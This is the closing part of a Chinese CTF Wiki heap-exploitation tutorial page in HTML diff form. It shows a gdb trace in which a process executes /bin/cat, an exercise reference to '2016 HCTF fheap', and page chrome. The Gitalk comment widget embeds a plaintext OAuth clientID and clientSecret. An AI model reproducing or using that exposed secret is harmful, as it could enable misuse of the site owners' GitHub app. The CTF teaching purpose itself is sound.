+<span class="err">[</span><span class="nf">New</span> <span class="no">process</span> <span class="mi">36249</span><span class="p">]</span>
+<span class="nf">process</span> <span class="mi">36249</span> <span class="no">is</span> <span class="no">executing</span> <span class="no">new</span> <span class="no">program</span><span class="p">:</span> <span class="err">/</span><span class="no">bin</span><span class="err">/</span><span class="no">cat</span>
+<span class="err">[</span><span class="nf">Inferior</span> <span class="mi">3</span> <span class="p">(</span><span class="no">process</span> <span class="mi">36249</span><span class="p">)</span> <span class="no">exited</span> <span class="no">normally</span><span class="p">]</span>
+</pre></div>
+
+<p>这里第一个输出了两次，应该是gef工具的问题。</p>
+<h2 id="_6">题目<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
+<ul>
+<li>2016 HCTF fheap</li>
+</ul>
+                
+                  
+                
+              
+              
+                <!-- Set from config but allow override -->
+   
+
+<hr>
+<blockquote class="page-copyright">
+    <p>本页面的全部内容在 <strong>CC BY-NC-SA 4.0</strong> 协议之条款下提供，附加条款亦可能应用。</p>
+</blockquote>
+<!-- Comments Integration -->
+ 
+<h2 id="__comments">评论</h2>
+<form id="gitalk-form" onsubmit="return false;">
+    <div id="gitalk-container"></div>
+</form>
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script src="https://cdnjs.loli.net/ajax/libs/blueimp-md5/2.10.0/js/md5.min.js"></script>
+<script>
+    const gitalk = new Gitalk({
+        clientID: 'd78d2e8d782d95560289',
+        clientSecret: '954f1e7f8ae9b2566272a2105fe8df60b50e8e9b',
+        repo: 'comment',
+        owner: 'ctf-wiki',
+        admin: ['40huo', 'iromise'],
+        id: md5(location.pathname),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+    })
+
+    gitalk.render('gitalk-container')
+</script> 
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid">
+        
+          <a href="../unlink/" title="Unlink" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
+            </div>
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  后退
+                </span>
+                Unlink
+              </span>
+            </div>
+          </a>
+        
+        
+          <a href="../fastbin_attack/" title="Fastbin Attack" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  前进
+                </span>
+                Fastbin Attack
+              </span>
+            </div>
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+          <div class="md-footer-copyright__highlight">
+            Copyright &copy; 2016 - 2018 CTF Wiki Team
+          </div>
+        
+        powered by
+        <a href="https://www.mkdocs.org">MkDocs</a>
+        and
+        <a href="https://squidfunk.github.io/mkdocs-material/">
+          Material for MkDocs</a>
+      </div>
+      
+        
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../../../assets/javascripts/application.a26c1c19.js"></script>
+      
+        
+        
+          
+          <script src="../../../../assets/javascripts/lunr/lunr.stemmer.support.js"></script>
+          
+            
+              
+                <script src="../../../../assets/javascripts/lunr/tinyseg.js"></script>
+              
+              
+                <script src="../../../../assets/javascripts/lunr/lunr.jp.js"></script>
+              
+            
+          
+          
+        
+      
+      <script>app.initialize({version:"1.0.4",url:{base:"../../../.."}})</script>
+      
+        <script src="https://cdnjs.loli.net/ajax/libs/pangu/3.3.0/pangu.min.js"></script>
+      
+        <script src="../../../../_static/js/extra.js"></script>
+      
+        <script src="https://cdnjs.loli.net/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+      
+        <script src="../../../../search/main.js"></script>
+      
+    
+    
+      
+    
+  </body>
+</html>
